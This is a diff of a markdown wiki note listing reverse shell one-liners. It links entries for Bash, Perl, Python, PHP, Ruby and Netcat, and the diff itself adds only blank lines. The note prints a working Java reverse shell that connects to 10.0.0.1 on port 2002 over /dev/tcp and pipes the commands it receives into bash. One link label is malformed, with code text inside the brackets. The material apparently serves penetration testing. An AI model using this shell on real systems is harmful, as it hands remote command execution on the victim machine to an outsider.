@@ -15,21 +15,71 @@ updated_at: '2023-10-10T18:30:00.297083+00:00'
 
 A list of reverse web shell one-liners
 
+
+
+
+
+
+
 **Command**: [[Bash Reverse Shell]]
+
+
+
+
+
+
 
 **Command**: [[Perl Reverse Shell]]
 
+
+
+
+
+
+
 **Command**: [[Python Reverse Shell]]
+
+
+
+
+
+
 
 **Command**: [[PHP Reverse Shell]]
 
+
+
+
+
+
+
 **Command**: [[Ruby Reverse Shell]]
+
+
+
+
+
+
 
 **Command**: [[Netcat -e Reverse Shell]]
 
+
+
+
+
+
+
+
+
 **Command**: [[Netcat without -e Piped Reverse Shell]]
 
+
+
+
+
 > Java Reverse Shell Code
+
+
 
 **Code** ([[r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","]]):
@@ -39,3 +89,47 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \ $line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
